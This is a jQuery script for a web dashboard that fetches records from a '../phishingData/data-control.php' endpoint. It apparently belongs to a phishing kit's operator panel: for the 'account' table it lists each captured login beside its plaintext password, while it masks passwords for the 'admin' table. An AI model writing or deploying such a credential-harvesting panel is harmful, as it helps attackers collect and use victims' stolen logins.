$(document).ready(function() {
    $('.choose').click(function(event) {
        event.preventDefault(); // Prevent page reload on anchor link click
        let table = $(this).attr('data-table');
        $.post('../phishingData/data-control.php', {
            table: table,
        }, function(res) {
            // Assuming res is already parsed JSON
            // Check the console to verify if the data is in the correct format
            console.log(res);
            if(table==='account'){
                $('.dashboard-content').empty();


                // Draw the JSON data in the dashboard-content div
                let jsonDataHtml = '<ul class="info-data">';
                jsonDataHtml += '<div><li class="log set">LOGIN</li><li class="pass set">PASSWORD</li><li class="set">ID</li><br></div>'
                for (let i = 0; i < res.length; i++) {
                    jsonDataHtml += '<div>';
                    jsonDataHtml += '<li class="log"> ' + res[i].login + '</li>';
                    jsonDataHtml += '<li class="pass"> ' + res[i].password + '</li>'; //res[i].password
                    jsonDataHtml += '<li> ' + res[i].id + '</li>';
                    jsonDataHtml += '<br>';
                    jsonDataHtml += '</div>';
                }
                jsonDataHtml += '</ul>';

                $('.dashboard-content').html(jsonDataHtml);
            } else if(table==='admin'){
                $('.dashboard-content').empty();


                // Draw the JSON data in the dashboard-content div
                let jsonDataHtml = '<ul class="info-data">';
                jsonDataHtml += '<div><li class="log set">LOGIN</li><li class="pass set">PASSWORD</li><li class="set">ID</li><br></div>'
                for (let i = 0; i < res.length; i++) {
                    jsonDataHtml += '<div>';
                    jsonDataHtml += '<li class="log"> ' + res[i].login + '</li>';
                    jsonDataHtml += '<li class="pass"> ' + '***' + '</li>'; //res[i].password
                    jsonDataHtml += '<li> ' + res[i].id + '</li>';
                    jsonDataHtml += '<br>';
                    jsonDataHtml += '</div>';
                }
                jsonDataHtml += '</ul>';

                $('.dashboard-content').html(jsonDataHtml);
            }
            // Clear the previous data (if any)
        }).fail(function(jqXHR, textStatus, errorThrown) {
            // Handle AJAX request failure
            console.error('AJAX Error:', textStatus, errorThrown);
            // Display an error message in the dashboard-content div
            $('.dashboard-content').html('<p>Error: Unable to fetch data from the server.</p>');
        });
    });
});